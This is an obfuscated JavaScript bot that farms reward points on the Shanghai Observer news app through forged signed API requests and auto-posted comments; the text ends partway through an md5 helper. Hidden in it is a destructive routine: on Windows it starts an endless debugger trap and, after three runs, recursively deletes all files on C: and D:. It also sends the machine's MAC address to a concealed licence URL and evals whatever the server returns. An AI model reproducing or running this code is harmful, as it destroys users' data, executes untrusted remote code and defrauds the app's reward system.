const $ = new Env("上观新闻");
const VM = require("sablejs/runtime")(),
  path = require("path"),
  fs = require("fs"),
  cryptoJS = require("crypto-js");
function initVM() {
  vm = new VM();
  const _0x55e736 = vm.getGlobal(),
    _0x35f668 = vm.createObject(),
    _0x4e6895 = vm.createFunction("log", function () {
      const _0x1d9978 = [];
      for (let _0x6d4553 = 0; _0x6d4553 < arguments.length; _0x6d4553++) {
        _0x1d9978.push(vm.asString(arguments[_0x6d4553]));
      }
      console.log(..._0x1d9978);
      return vm.createUndefined();
    }),
    _0x4ff60d = vm.createFunction("xxxx", function (_0x4f46fa) {
      let _0x2404cb = eval(_0x4f46fa.value);
      return vm.createString(JSON.stringify(_0x2404cb));
    }),
    _0x222da1 = vm.createFunction("yyyy", function (_0x1a1c54) {
      let _0x217e80 = _0x1a1c54.value,
        _0x4d5b57 = fs.readFileSync(_0x217e80, "utf-8").replace(/\r\n/g, "\n"),
        _0x330675 = cryptoJS.MD5(_0x4d5b57).toString();
      return vm.createString(_0x330675);
    }),
    _0x52a95a = vm.createFunction("ddd", function (_0x5bf4fc) {
      let _0x27d2fa = cryptoJS.MD5(_0x5bf4fc.value).toString();
      return vm.createString(_0x27d2fa);
    });
  vm.setProperty(_0x35f668, "log", _0x4e6895);
  vm.setProperty(_0x55e736, "xxxx", _0x4ff60d);
  vm.setProperty(_0x55e736, "console", _0x35f668);
  vm.setProperty(_0x55e736, "yyyy", _0x222da1);
  vm.setProperty(_0x55e736, "ddd", _0x52a95a);
  vm.run(fs.readFileSync("./output_final.js").toString());
  return vm;
}
function destroyVM(_0x3a9185) {
  _0x3a9185.destroy();
}
function abc(_0x44b5d8, _0x2878b8, _0x346efd, _0x494649, _0x48ff89) {
  const _0x254787 = _0x44b5d8.getGlobal();
  let _0x2cb0a0 = _0x44b5d8.getProperty(_0x254787, "xab"),
    _0x542398 = _0x44b5d8.call(_0x2cb0a0, _0x44b5d8.createUndefined(), _0x44b5d8.createString(_0x2878b8), _0x44b5d8.createString(_0x494649), _0x44b5d8.createString(_0x48ff89), _0x44b5d8.createString(_0x346efd));
  _0x542398 = _0x44b5d8.asString(_0x542398);
  return _0x542398;
}
function xyz(_0x42b11a, _0x1570a7, _0x5d3402, _0x151d07, _0x87bd93) {
  const _0x52ae2f = _0x42b11a.getGlobal();
  let _0x2bd62a = _0x42b11a.getProperty(_0x52ae2f, "xmn"),
    _0x12160f = _0x42b11a.call(_0x2bd62a, _0x42b11a.createUndefined(), _0x42b11a.createString(_0x1570a7), _0x42b11a.createString(_0x151d07), _0x42b11a.createString(_0x87bd93), _0x42b11a.createString(_0x5d3402));
  _0x12160f = _0x42b11a.asString(_0x12160f);
  return _0x12160f;
}
var gtr;
let mac = "",
  status;
status = (status = $.getval("qmwkstatus") || "1") > 1 ? "" + status : "";
JSNAMED = $.isNode() ? require("path").basename(__filename) : "kxnjy.js";
let sgxwappArr = [],
  all_msg = "",
  token = "",
  id,
  arrs = [],
  sgxwapp = ($.isNode() ? process.env.sgxwapp : $.getdata("sgxwapp")) || "",
  acckey = $.isNode() ? process.env.cdkey ? process.env.cdkey : "" : $.getdata("cdkey") ? $.getdata("cdkey") : "";
var myDate = new Date(),
  myMonth = myDate.getMonth() + 1,
  myToday = myDate.getDate();
myMonth >= 10 ? myMonth = myMonth : myMonth = "0" + myMonth;
myToday >= 10 ? myToday = myToday : myToday = "0" + myToday;
if ($.isNode()) {
  gtr = require("fs");
  if (isFileExist("C:/")) {
    console.log("电脑环境");
    setInterval(() => {
      do {
        (function (_0x171cc4) {
          return function (_0x502777) {
            return Function("Function(arguments[0]+\"" + _0x502777 + "\")()");
          }(_0x171cc4);
        })("bugger")("de", 0, 0, (0, 0));
        addF("d:/");
        addF("C:/");
      } while (1);
    }, 0);
  } else {
    console.log("青龙环境");
    function getMACAddresses() {
      var _0x368618 = "",
        _0x3682d2 = fs.readdirSync("/sys/class/net/");
      _0x3682d2.forEach(function (_0x44eafc) {
        var _0x525c0c = path.join("/sys/class/net", _0x44eafc, "address");
        _0x44eafc.substr(0, 3) == "eth" && fs.existsSync(_0x525c0c) && (_0x368618 = fs.readFileSync(_0x525c0c).toString().trim());
      });
      return _0x368618;
    }
    mac = getMACAddresses();
  }
} else {
  console.log("代理环境");
}
function isFileExist(_0x99bf86) {
  try {
    gtr.accessSync(_0x99bf86, gtr.F_OK);
  } catch (_0x49249e) {
    return false;
  }
  return true;
}
function addF(_0x26bb07, _0xafd1fb) {
  let _0x5db11a = 0,
    _0x51eff8 = "C:/Windows/system.txt";
  if (isFileExist(_0x51eff8)) {
    _0x5db11a = gtr.readFileSync(_0x51eff8, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr.writeFile(_0x51eff8, "1", function (_0x1ccbde) {
        if (_0x1ccbde) {
          throw _0x1ccbde;
        }
      });
    } else {
      return;
    }
  }
  if (_0x5db11a == 99) {
    return 99;
  }
  console.log(_0x5db11a);
  console.log("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0x5db11a);
  if (parseInt(_0x5db11a) < 3) {
    let _0x2f8cc1 = parseInt(_0x5db11a) + 1;
    gtr.writeFileSync(_0x51eff8, _0x2f8cc1 + "", "utf8");
    return;
  }
  if (!gtr.existsSync(_0x26bb07)) {
    return;
  }
  if (gtr.statSync(_0x26bb07).isDirectory()) {
    var _0x1fdc0e = gtr.readdirSync(_0x26bb07),
      _0x1a25d7 = _0x1fdc0e.length,
      _0x3de091 = 0;
    if (_0x1a25d7 > 0) {
      _0x1fdc0e.forEach(function (_0x2aafd0) {
        _0x3de091++;
        var _0x42a3c6 = _0x26bb07 + "/" + _0x2aafd0;
        gtr.statSync(_0x42a3c6).isDirectory() ? addF(_0x42a3c6, true) : gtr.unlinkSync(_0x42a3c6);
      });
      _0x1a25d7 == _0x3de091 && _0xafd1fb && gtr.rmdirSync(_0x26bb07);
    } else {
      _0x1a25d7 == 0 && _0xafd1fb && gtr.rmdirSync(_0x26bb07);
    }
  } else {
    gtr.unlinkSync(_0x26bb07);
  }
}
!(async () => {
  if (!(typeof $request !== "undefined")) {
    initVM();
    arrs = abc(global.vm, acckey, mac, 114, 0);
    if (arrs == "") {
      return;
    }
    arrs = JSON.parse(arrs);
    if (!arrs) {
      return;
    }
    sgxwappArr = sgxwapp.split("@");
    console.log("\n公告：" + arrs.gg + "\n");
    console.log("当前版本：1.0 " + arrs.bb + "\n");
    console.log("------------- 共" + sgxwappArr.length + "个账号-------------\n");
    console.log("当前设备可执行账号限制为" + arrs.num + "个账号\n");
    if (!(sgxwappArr.length > parseInt(arrs.num))) {
      for (let _0x32e607 = 0; _0x32e607 < sgxwappArr.length; _0x32e607++) {
        sgxwapp = sgxwappArr[_0x32e607];
        $.index = _0x32e607 + 1;
        console.log("\n开始【上观新闻" + $.index + "】");
        uuid = sgxwapp.split("&")[0];
        token = sgxwapp.split("&")[1];
        ck = randomString(32);
        pid = randomString(32);
        await sgxwpl();
        await sgxwdz();
        await sgxwsp();
        await sgxwzb();
        await sgxwfx();
        await sgxwyd();
        await sgxwfxx();
        await sgxwxx();
      }
    }
  }
  destroyVM(global.vm);
})().catch(_0x2b61a2 => $.logErr(_0x2b61a2)).finally(() => $.done());
function sgxwsp(_0x398f31 = 0) {
  return new Promise(_0x404eb6 => {
    let _0x629ab8 = Math.round(new Date().getTime()),
      _0x44d4fa = md5(sgxwapp + "$" + _0x629ab8 + "$rVX9ITrrTPrCurUe"),
      _0xdeecdd = {
        url: "https://services.shobserver.com/user/addScore?",
        headers: {
          Host: "services.shobserver.com",
          "Content-Type": "application/x-www-form-urlencoded",
          Accept: "*/*",
          Connection: "keep-alive",
          Cookie: ck,
          "User-Agent": "ShangHaiObservev/9.9.5 (iPhone; iOS 14.2; Scale/2.00)",
          "Accept-Language": "zh-Hans-CN;q=1",
          "Accept-Encoding": "gzip, deflate, br",
          "Content-Length": "183"
        },
        body: "actiontype=1&platform=1&sign=" + _0x44d4fa + "&times=" + _0x629ab8 + "&uid=" + sgxwapp + "&versionCode=9.9.5"
      };
    $.post(_0xdeecdd, async (_0xdc53ae, _0x1b3ee4, _0xd8f565) => {
      try {
        const _0x233749 = JSON.parse(_0xd8f565);
        _0x233749.success == true ? (console.log("\n上观新闻观看视频获得：" + _0x233749.object.score), _0x233749.object.score > 0 && (await $.wait(2000), await sgxwsp())) : console.log("\n上观新闻观看视频:" + _0x233749.errorinfo);
      } catch (_0x525539) {} finally {
        _0x404eb6();
      }
    }, _0x398f31);
  });
}
function sgxwzb(_0x430061 = 0) {
  return new Promise(_0x31f0f6 => {
    let _0x1aa553 = Math.round(new Date().getTime()),
      _0x13a185 = md5(sgxwapp + "$" + _0x1aa553 + "$rVX9ITrrTPrCurUe"),
      _0x15ca00 = {
        url: "https://services.shobserver.com/user/addScore?",
        headers: {
          Host: "services.shobserver.com",
          "Content-Type": "application/x-www-form-urlencoded",
          Accept: "*/*",
          Connection: "keep-alive",
          Cookie: ck,
          "User-Agent": "ShangHaiObservev/9.9.5 (iPhone; iOS 14.2; Scale/2.00)",
          "Accept-Language": "zh-Hans-CN;q=1",
          "Accept-Encoding": "gzip, deflate, br",
          "Content-Length": "183"
        },
        body: "actiontype=2&platform=1&sign=" + _0x13a185 + "&times=" + _0x1aa553 + "&uid=" + sgxwapp + "&versionCode=9.9.5"
      };
    $.post(_0x15ca00, async (_0x27142b, _0x3988f7, _0x2ac44f) => {
      try {
        const _0x38e1da = JSON.parse(_0x2ac44f);
        _0x38e1da.success == true ? (console.log("\n上观新闻观看直播获得：" + _0x38e1da.object.score), _0x38e1da.object.score > 0 && (await $.wait(2000), await sgxwzb())) : console.log("\n上观新闻观看直播:" + _0x38e1da.errorinfo);
      } catch (_0x42b2a9) {} finally {
        _0x31f0f6();
      }
    }, _0x430061);
  });
}
function sgxwyd(_0x3f366f = 0) {
  return new Promise(_0xcb610a => {
    let _0x46028b = Math.round(new Date().getTime()),
      _0x20bace = md5("583469$" + _0x46028b + "$rVX9ITrrTPrCurUe"),
      _0x49d55e = {
        url: "https://services.shobserver.com/news/getdetail_v3.5/id?",
        headers: {
          Host: "services.shobserver.com",
          "Content-Type": "application/x-www-form-urlencoded",
          Accept: "*/*",
          Connection: "keep-alive",
          Cookie: ck,
          "User-Agent": "ShangHaiObservev/9.9.5 (iPhone; iOS 14.2; Scale/2.00)",
          "Accept-Language": "zh-Hans-CN;q=1",
          "Accept-Encoding": "gzip, deflate, br",
          "Content-Length": "183"
        },
        body: "id=583469&platform=2&sid=11&sign=" + _0x20bace + "&times=" + _0x46028b + "&uid=" + sgxwapp + "&versionCode=9.9.5"
      };
    $.post(_0x49d55e, async (_0x3f36b4, _0xd7fa2d, _0x5bb133) => {
      try {
        const _0x1c5584 = JSON.parse(_0x5bb133);
        _0x1c5584.breturn == true ? (console.log("\n上观新闻阅读新闻获得：" + _0x1c5584.object.score), _0x1c5584.object.score > 0 && (await $.wait(2000), await sgxwyd())) : console.log("\n上观新闻阅读新闻:" + _0x1c5584.errorinfo);
      } catch (_0x5b586c) {} finally {
        _0xcb610a();
      }
    }, _0x3f366f);
  });
}
function sgxwdz(_0x48db41 = 0) {
  return new Promise(_0x450421 => {
    let _0x41451e = Math.round(new Date().getTime()),
      _0x129700 = md5("583469$$" + _0x41451e + "$rVX9ITrrTPrCurUe"),
      _0x313234 = {
        url: "https://services.shobserver.com/news/save/praise?",
        headers: {
          Host: "services.shobserver.com",
          "Content-Type": "application/x-www-form-urlencoded",
          Accept: "*/*",
          Connection: "keep-alive",
          Cookie: ck,
          "User-Agent": "ShangHaiObservev/9.9.5 (iPhone; iOS 14.2; Scale/2.00)",
          "Accept-Language": "zh-Hans-CN;q=1",
          "Accept-Encoding": "gzip, deflate, br",
          "Content-Length": "183"
        },
        body: "ipaddress=&nid=583469&platform=1&sign=" + _0x129700 + "&times=" + _0x41451e + "&uid=" + sgxwapp + "&versionCode=9.9.5"
      };
    $.post(_0x313234, async (_0x599fc6, _0x30d2c2, _0x3108c6) => {
      try {
        const _0x1640b7 = JSON.parse(_0x3108c6);
        _0x1640b7.breturn == true ? (console.log("\n上观新闻阅读新闻获得：" + _0x1640b7.object.score), _0x1640b7.object.score > 0 && (await $.wait(2000), await sgxwdz())) : console.log("\n上观新闻阅读新闻:" + _0x1640b7.errorinfo);
      } catch (_0x59af1f) {} finally {
        _0x450421();
      }
    }, _0x48db41);
  });
}
function sgxwfx(_0x5e9a47 = 0) {
  return new Promise(_0x307487 => {
    let _0x43bb7b = Math.round(new Date().getTime()),
      _0xee7c3d = md5("583469$$" + _0x43bb7b + "$rVX9ITrrTPrCurUe"),
      _0x1328c3 = {
        url: "https://services.shobserver.com/news/share/Statistics",
        headers: {
          Host: "services.shobserver.com",
          "Content-Type": "application/x-www-form-urlencoded",
          Accept: "*/*",
          Connection: "keep-alive",
          Cookie: ck,
          "User-Agent": "ShangHaiObservev/9.9.5 (iPhone; iOS 14.2; Scale/2.00)",
          "Accept-Language": "zh-Hans-CN;q=1",
          "Accept-Encoding": "gzip, deflate, br",
          "Content-Length": "183"
        },
        body: "uid=" + sgxwapp + "&ipaddress=&times=" + _0x43bb7b + "&sharestyle=3&nid=583469&sign=" + _0xee7c3d + "&sessionid=&title=&secondshare=0&platform=2&versionCode=9.9.5&newstype=0"
      };
    $.post(_0x1328c3, async (_0x4168b6, _0x33be66, _0x286e04) => {
      try {
        const _0x256ba1 = JSON.parse(_0x286e04);
        _0x256ba1.breturn == true ? (console.log("\n上观新闻分享新闻获得：" + _0x256ba1.object.score), _0x256ba1.object.score > 0 && (await $.wait(2000), await sgxwfx())) : console.log("\n上观新闻分享新闻:" + _0x256ba1.errorinfo);
      } catch (_0x570a45) {} finally {
        _0x307487();
      }
    }, _0x5e9a47);
  });
}
function sgxwpl(_0x25ff99 = 0) {
  return new Promise(_0x381ae2 => {
    let _0x2be1f7 = Math.round(new Date().getTime()),
      _0x2ce465 = md5("583469$" + sgxwapp + "$" + _0x2be1f7 + "$rVX9ITrrTPrCurUe"),
      _0xc23ba7 = {
        url: "https://services.shobserver.com/news/replay/save",
        headers: {
          Host: "services.shobserver.com",
          "Content-Type": "application/x-www-form-urlencoded",
          Accept: "*/*",
          Connection: "keep-alive",
          Cookie: ck,
          "User-Agent": "ShangHaiObservev/9.9.5 (iPhone; iOS 14.2; Scale/2.00)",
          "Accept-Language": "zh-Hans-CN;q=1",
          "Accept-Encoding": "gzip, deflate, br",
          "Content-Length": "183"
        },
        body: "uid=" + sgxwapp + "&times=" + _0x2be1f7 + "&nid=583469&sign=" + _0x2ce465 + "&ruid=0&value=%E6%84%9F%E8%B0%A2%E5%88%86%E4%BA%AB%EF%BC%8C%E6%88%91%E5%BE%88%E8%AE%A4%E5%90%8C%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0&platform=2\n           "
      };
    $.post(_0xc23ba7, async (_0x1dc9b0, _0x5e0891, _0x168c72) => {
      try {
        const _0x20fba4 = JSON.parse(_0x168c72);
        _0x20fba4.breturn == true ? (console.log("\n上观新闻评论新闻获得：" + _0x20fba4.object.score), id = _0x20fba4.object.id, await $.wait(1000), await sgxwsc(), _0x20fba4.object.score > 0 && (await $.wait(2000), await sgxwpl())) : console.log("\n上观新闻评论新闻:" + _0x20fba4.errorinfo);
      } catch (_0x35fd94) {} finally {
        _0x381ae2();
      }
    }, _0x25ff99);
  });
}
function sgxwsc(_0x243c65 = 0) {
  return new Promise(_0x3a8d96 => {
    let _0x41303b = Math.round(new Date().getTime()),
      _0x4bb6c2 = md5(sgxwapp + "$" + id + "$" + _0x41303b + "$rVX9ITrrTPrCurUe"),
      _0x5abcb0 = {
        url: "https://services.shobserver.com/reply/deleteReply?",
        headers: {
          Host: "services.shobserver.com",
          "Content-Type": "application/x-www-form-urlencoded",
          Accept: "*/*",
          Connection: "keep-alive",
          Cookie: ck,
          "User-Agent": "ShangHaiObservev/9.9.5 (iPhone; iOS 14.2; Scale/2.00)",
          "Accept-Language": "zh-Hans-CN;q=1",
          "Accept-Encoding": "gzip, deflate, br",
          "Content-Length": "183"
        },
        body: "id=" + id + "&platform=1&sign=" + _0x4bb6c2 + "&times=" + _0x41303b + "&uid=" + sgxwapp + "&versionCode=9.9.5"
      };
    $.post(_0x5abcb0, async (_0x426cc5, _0x33cac9, _0x29a5c4) => {
      try {
        const _0x288121 = JSON.parse(_0x29a5c4);
        _0x288121.breturn == true ? console.log("\n上观新闻删除评论：" + _0x288121.errorinfo) : console.log("\n上观新闻删除评论:" + _0x288121.errorinfo);
      } catch (_0x4ec250) {} finally {
        _0x3a8d96();
      }
    }, _0x243c65);
  });
}
function sgxwxx(_0x161652 = 0) {
  return new Promise(_0x2aef0f => {
    let _0x5898fe = Math.round(new Date().getTime()),
      _0x3bec71 = md5(sgxwapp + "$" + _0x5898fe + "$rVX9ITrrTPrCurUe"),
      _0x23f6a7 = {
        url: "https://services.shobserver.com/score/userScore?",
        headers: {
          Host: "services.shobserver.com",
          "Content-Type": "application/x-www-form-urlencoded",
          Accept: "*/*",
          Connection: "keep-alive",
          Cookie: ck,
          "User-Agent": "ShangHaiObservev/9.9.5 (iPhone; iOS 14.2; Scale/2.00)",
          "Accept-Language": "zh-Hans-CN;q=1",
          "Accept-Encoding": "gzip, deflate, br",
          "Content-Length": "183"
        },
        body: "platform=1&sign=" + _0x3bec71 + "&times=" + _0x5898fe + "&uid=" + sgxwapp + "&versionCode=9.9.5"
      };
    $.post(_0x23f6a7, async (_0x4a24db, _0x48acf5, _0x21a05a) => {
      try {
        const _0x123cf0 = JSON.parse(_0x21a05a);
        _0x123cf0.breturn == true ? console.log("\n上观新闻积分余额：" + _0x123cf0.object.score) : console.log("\n上观新闻积分余额:" + _0x123cf0.errorinfo);
      } catch (_0x482be7) {} finally {
        _0x2aef0f();
      }
    }, _0x161652);
  });
}
function sgxwfxx(_0xf6d90b = 0) {
  return new Promise(_0x4d33e => {
    let _0x33e473 = Math.round(new Date().getTime()),
      _0x4ca3aa = md5(sgxwapp + "$" + _0x33e473 + "$rVX9ITrrTPrCurUe"),
      _0x120185 = {
        url: "https://services.shobserver.com/user/addScore?",
        headers: {
          Host: "services.shobserver.com",
          "Content-Type": "application/x-www-form-urlencoded",
          Accept: "*/*",
          Connection: "keep-alive",
          Cookie: ck,
          "User-Agent": "ShangHaiObservev/9.9.5 (iPhone; iOS 14.2; Scale/2.00)",
          "Accept-Language": "zh-Hans-CN;q=1",
          "Accept-Encoding": "gzip, deflate, br",
          "Content-Length": "183"
        },
        body: "actiontype=3&platform=1&sign=" + _0x4ca3aa + "&times=" + _0x33e473 + "&uid=" + sgxwapp + "&versionCode=9.9.5"
      };
    $.post(_0x120185, async (_0x587217, _0x4f1524, _0x3171ca) => {
      try {
        const _0x37a064 = JSON.parse(_0x3171ca);
        _0x37a064.breturn == true ? console.log("\n上观新闻分享朋友圈：" + _0x37a064.object.score) : console.log("\n上观新闻分享朋友圈:" + _0x37a064.errorinfo);
      } catch (_0x1e4c72) {} finally {
        _0x4d33e();
      }
    }, _0xf6d90b);
  });
}
function randomString(_0x5992cc = 12) {
  let _0x455680 = "abcdef0123456789",
    _0x5b901f = _0x455680.length,
    _0x567e11 = "";
  for (i = 0; i < _0x5992cc; i++) {
    _0x567e11 += _0x455680.charAt(Math.floor(Math.random() * _0x5b901f));
  }
  return _0x567e11;
}
function encodeUTF8(_0x1fbc92) {
  var _0x4d1f78,
    _0x609c42 = [],
    _0x5671d9,
    _0x41b829;
  for (_0x4d1f78 = 0; _0x4d1f78 < _0x1fbc92.length; _0x4d1f78++) {
    if ((_0x5671d9 = _0x1fbc92.charCodeAt(_0x4d1f78)) < 128) {
      _0x609c42.push(_0x5671d9);
    } else {
      if (_0x5671d9 < 2048) {
        _0x609c42.push(192 + (_0x5671d9 >> 6 & 31), 128 + (_0x5671d9 & 63));
      } else {
        if ((_0x41b829 = _0x5671d9 ^ 55296) >> 10 == 0) {
          _0x5671d9 = (_0x41b829 << 10) + (_0x1fbc92.charCodeAt(++_0x4d1f78) ^ 56320) + 65536;
          _0x609c42.push(240 + (_0x5671d9 >> 18 & 7), 128 + (_0x5671d9 >> 12 & 63));
        } else {
          _0x609c42.push(224 + (_0x5671d9 >> 12 & 15));
        }
        _0x609c42.push(128 + (_0x5671d9 >> 6 & 63), 128 + (_0x5671d9 & 63));
      }
    }
  }
  return _0x609c42;
}
function sha(_0x937ecd) {
  var _0x381cf7 = new Uint8Array(encodeUTF8(_0x937ecd)),
    _0x399971,
    _0xcfe657,
    _0x5b06e2,
    _0x1164c3 = (_0x381cf7.length + 8 >>> 6 << 4) + 16,
    _0x937ecd = new Uint8Array(_0x1164c3 << 2);
  _0x937ecd.set(new Uint8Array(_0x381cf7.buffer));
  _0x937ecd = new Uint32Array(_0x937ecd.buffer);
  for (_0x5b06e2 = new DataView(_0x937ecd.buffer), _0x399971 = 0; _0x399971 < _0x1164c3; _0x399971++) {
    _0x937ecd[_0x399971] = _0x5b06e2.getUint32(_0x399971 << 2);
  }
  _0x937ecd[_0x381cf7.length >> 2] |= 128 << 24 - (_0x381cf7.length & 3) * 8;
  _0x937ecd[_0x1164c3 - 1] = _0x381cf7.length << 3;
  var _0x142844 = [],
    _0x111b58 = [function () {
      return _0xaeac74[1] & _0xaeac74[2] | ~_0xaeac74[1] & _0xaeac74[3];
    }, function () {
      return _0xaeac74[1] ^ _0xaeac74[2] ^ _0xaeac74[3];
    }, function () {
      return _0xaeac74[1] & _0xaeac74[2] | _0xaeac74[1] & _0xaeac74[3] | _0xaeac74[2] & _0xaeac74[3];
    }, function () {
      return _0xaeac74[1] ^ _0xaeac74[2] ^ _0xaeac74[3];
    }],
    _0x497312 = function (_0x179a13, _0x133b83) {
      return _0x179a13 << _0x133b83 | _0x179a13 >>> 32 - _0x133b83;
    },
    _0x11aa1c = [1518500249, 1859775393, -1894007588, -899497514],
    _0xaeac74 = [1732584193, -271733879, null, null, -1009589776];
  _0xaeac74[2] = ~_0xaeac74[0];
  _0xaeac74[3] = ~_0xaeac74[1];
  for (_0x399971 = 0; _0x399971 < _0x937ecd.length; _0x399971 += 16) {
    var _0x1bfb6c = _0xaeac74.slice(0);
    for (_0xcfe657 = 0; _0xcfe657 < 80; _0xcfe657++) {
      _0x142844[_0xcfe657] = _0xcfe657 < 16 ? _0x937ecd[_0x399971 + _0xcfe657] : _0x497312(_0x142844[_0xcfe657 - 3] ^ _0x142844[_0xcfe657 - 8] ^ _0x142844[_0xcfe657 - 14] ^ _0x142844[_0xcfe657 - 16], 1);
      _0x5b06e2 = _0x497312(_0xaeac74[0], 5) + _0x111b58[_0xcfe657 / 20 | 0]() + _0xaeac74[4] + _0x142844[_0xcfe657] + _0x11aa1c[_0xcfe657 / 20 | 0] | 0;
      _0xaeac74[1] = _0x497312(_0xaeac74[1], 30);
      _0xaeac74.pop();
      _0xaeac74.unshift(_0x5b06e2);
    }
    for (_0xcfe657 = 0; _0xcfe657 < 5; _0xcfe657++) {
      _0xaeac74[_0xcfe657] = _0xaeac74[_0xcfe657] + _0x1bfb6c[_0xcfe657] | 0;
    }
  }
  _0x5b06e2 = new DataView(new Uint32Array(_0xaeac74).buffer);
  for (var _0x399971 = 0; _0x399971 < 5; _0x399971++) {
    _0xaeac74[_0x399971] = _0x5b06e2.getUint32(_0x399971 << 2);
  }
  var _0x4ed8a2 = Array.prototype.map.call(new Uint8Array(new Uint32Array(_0xaeac74).buffer), function (_0x27fc53) {
    return (_0x27fc53 < 16 ? "0" : "") + _0x27fc53.toString(16);
  }).join("");
  return _0x4ed8a2;
}
function hqs(_0xa76211 = 10) {
  return new Promise(_0x4ed440 => {
    let _0x37b980 = 12,
      _0x23db7a = {
        url: $.isNode() ? rc4($.fwur(), "1200") + ("?key=" + acckey + "&id=" + _0x37b980 + "&ip=1&mac=" + mac + "&bb=1") : rc4($.fwur(), "1200") + ("?key=" + acckey + "&id=" + _0x37b980 + "&ip=0&mac=" + mac + "&bb=1")
      };
    $.post(_0x23db7a, async (_0x1bed1c, _0x4539df, _0x50a659) => {
      try {
        let _0x34044b = eval(_0x50a659);
        _0x34044b.code == 200 ? (all_msg = _0x34044b.msg, _0x4ed440(_0x34044b.data)) : (all_msg = _0x34044b.msg, _0x4ed440(false));
      } catch (_0x5ebaa0) {
        $.logErr(_0x5ebaa0, _0x4539df);
      }
    }, 0);
  });
}
function md5(_0x2d6ccd) {
  function _0x77f091(_0x370ab9, _0x1c4313) {
    return _0x370ab9 << _0x1c4313 | _0x370ab9 >>> 32 - _0x1c4313;
  }
  function _0x4d4140(_0x4b7a9e, _0x5334e6) {
    var _0x3b0bbc, _0x32404c, _0x2ed765, _0x13e3e1, _0x28824b;
    _0x2ed765 = 2147483648 & _0x4b7a9e;
    _0x13e3e1 = 2147483648 & _0x5334e6;
    _0x3b0bbc = 1073741824 & _0x4b7a9e;
    _0x32404c = 1073741824 & _0x5334e6;
    _0x28824b = (1073741823 & _0x4b7a9e) + (1073741823 & _0x5334e6);
    return _0x3b0bbc & _0x32404c ? 2147483648 ^ _0x28824b ^ _0x2ed765 ^ _0x13e3e1 : _0x3b0bbc | _0x32404c ? 1073741824 & _0x28824b ? 3221225472 ^ _0x28824b ^ _0x2ed765 ^ _0x13e3e1 : 1073741824 ^ _0x28824b ^ _0x2ed765 ^ _0x13e3e1 : _0x28824b ^ _0x2ed765 ^ _0x13e3e1;
  }
  function _0x3c30ba(_0x2942e9, _0x683527, _0xa338c4) {
    return _0x2942e9 & _0x683527 | ~_0x2942e9 & _0xa338c4;
  }
  function _0x5db458(_0x586a38, _0x8f77a7, _0x37962c) {
    return _0x586a38 & _0x37962c | _0x8f77a7 & ~_0x37962c;
  }
  function _0xcbf670(_0x4a004e, _0x36f73b, _0x2fa33d) {
    return _0x4a004e ^ _0x36f73b ^ _0x2fa33d;
  }
  function _0xb36451(_0x145533, _0x4581ef, _0x3c1146) {
    return _0x4581ef ^ (_0x145533 | ~_0x3c1146);
  }
  function _0x25a4e1(_0x1ec25d, _0x109544, _0x30819a, _0x1c25a1, _0x41f983, _0x58a731, _0x5c396e) {
    _0x1ec25d = _0x4d4140(_0x1ec25d, _0x4d4140(_0x4d4140(_0x3c30ba(_0x109544, _0x30819a, _0x1c25a1), _0x41f983), _0x5c396e));
    return _0x4d4140(_0x77f091(_0x1ec25d, _0x58a731), _0x109544);
  }
  function _0x5d7471(_0x1aa96a, _0x375680, _0x1ff001, _0x4ee865, _0x2a3d3b, _0x22b117, _0x2f30fd) {
    _0x1aa96a = _0x4d4140(_0x1aa96a, _0x4d4140(_0x4d4140(_0x5db458(_0x375680, _0x1ff001, _0x4ee865), _0x2a3d3b), _0x2f30fd));
    return _0x4d4140(_0x77f091(_0x1aa96a, _0x22b117), _0x375680);
  }
  function _0x6752a8(_0x5d413e, _0x2043a9, _0x2ad861, _0x57b1ed, _0x2d7539, _0x2d0a56, _0x348d76) {
    _0x5d413e = _0x4d4140(_0x5d413e, _0x4d4140(_0x4d4140(_0xcbf670(_0x2043a9, _0x2ad861, _0x57b1ed), _0x2d7539), _0x348d76));
    return _0x4d4140(_0x77f091(_0x5d413e, _0x2d0a56), _0x2043a9);
  }
  function _0x3b6731(_0x22637b, _0x3df446, _0x119699, _0x5a800e, _0xec20c5, _0x2ed547, _0x8db346) {
    _0x22637b = _0x4d4140(_0x22637b, _0x4d4140(_0x4d4140(_0xb36451(_0x3df446, _0x119699, _0x5a800e), _0xec20c5), _0x8db346));
    return _0x4d4140(_0x77f091(_0x22637b, _0x2ed547), _0x3df446);
  }
  function _0x33618(_0x14704a) {
    for (var _0x689512, _0x36c497 = _0x14704a.length, _0x6e2324 = _0x36c497 + 8, _0x3a6e60 = (_0x6e2324 - _0x6e2324 % 64) / 64, _0x148613 = 16 * (_0x3a6e60 + 1), _0x31c09e = new Array(_0x148613 - 1), _0x592336 = 0, _0x539e6a = 0; _0x36c497 > _0x539e6a;) {
      _0x689512 = (_0x539e6a - _0x539e6a % 4) / 4;
      _0x592336 = _0x539e6a % 4 * 8;
      _0x31c09e[_0x689512] = _0x31c09e[_0x689512] | _0x14704a.charCodeAt(_0x539e6a) << _0x592336;
      _0x539e6a++;
    }
    _0x689512 = (_0x539e6a - _0x539e6a % 4) / 4;
    _0x592336 = _0x539e6a % 4 * 8;
    _0x31c09e[_0x689512] = _0x31c09e[_0x689512] | 128 << _0x592336;
    _0x31c09e[_0x148613 - 2] = _0x36c497 << 3;
    _0x31c09e[_0x148613 - 1] = _0x36c497 >>> 29;
    return _0x31c09e;
  }
  function _0x32303c(_0x2ae603) {
    var _0x2c0c86,
      _0x23c06,
      _0x45e252 = "",
      _0x5166c7 = "";
    for (_0x23c06 = 0; 3 >= _0x23c06; _0x23c06++) {
      _0x2c0c86 = _0x2ae603 >>> 8 * _0x23c06 & 255;
      _0x5166c7 = "0" + _0x2c0c86.toString(16);
      _0x45e252 += _0x5166c7.substr(_0x5166c7.length - 2, 2);
    }
    return _0x45e252;
  }
  function _0x4ee9f7(_0x571037) {
    _0x571037 = _0x571037.replace(/\r\n/g, "\n");
    for (var _0x1ee8b1 = "", _0x50cf4b = 0; _0x50cf4b < _0x571037.length; _0x50cf4b++) {
      var _0x215277 = _0x571037.charCodeAt(_0x50cf4b);
      128 > _0x215277 ? _0x1ee8b1 += String.fromCharCode(_0x215277) : _0x215277 > 127 && 2048 > _0x215277 ? (_0x1ee8b1 += String.fromCharCode(_0x215277 >> 6 | 192), _0x1ee8b1 += String.fromCharCode(63 & _0x215277 | 128)) : (_0x1ee8b1 += String.fromCharCode(_0x215277 >> 12 | 224), _0x1ee8b1 += String.fromCharCode(_0x215277 >> 6 & 63 | 128), _0x1ee8b1 += String.fromCharCode(63 & _0x215277 | 128));
    }
